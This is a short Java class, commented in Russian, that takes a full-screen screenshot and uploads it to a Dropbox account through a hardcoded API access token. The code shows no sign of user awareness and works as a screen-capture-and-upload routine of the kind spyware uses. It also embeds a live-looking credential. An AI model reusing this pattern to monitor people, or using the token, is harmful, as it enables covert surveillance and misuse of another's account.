import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;


public class ScreenCapture extends Thread{
    @Override
    public void run() {
        //обозначение текущей даты и времени для её использования
        SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss dd:MM:yyyy");
        Date now = new Date();

        // Создания и обозначение робота для захвата экрана
        Robot robot = null;
        try {
            robot = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }

        //Создание скриншота при помощи робота
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage screenFullImage = robot.createScreenCapture(screenRect);

        // Ключ доступа
        String ACCESS_TOKEN = "6ofAGISD6YAAAAAAAAAAASCr5uvbvEHco543hBmqHqF-vbbcR4eMExuQJ9WDT7J9";
        //Подключение DropBox через ключ доступа
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        // отправка файлов в DropBox из кэша
        try {
            ByteArrayOutputStream os = new ByteArrayOutputStream();
            ImageIO.write(screenFullImage, "png", os);
            InputStream in = new ByteArrayInputStream(os.toByteArray());
            client.files().uploadBuilder("/capture " + dateFormat.format(now) + ".png")
                    .uploadAndFinish(in);
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }

        //Дата и время окончания работы
        System.out.println("Скриншот отправлен в: " + dateFormat.format(now));

    }

}

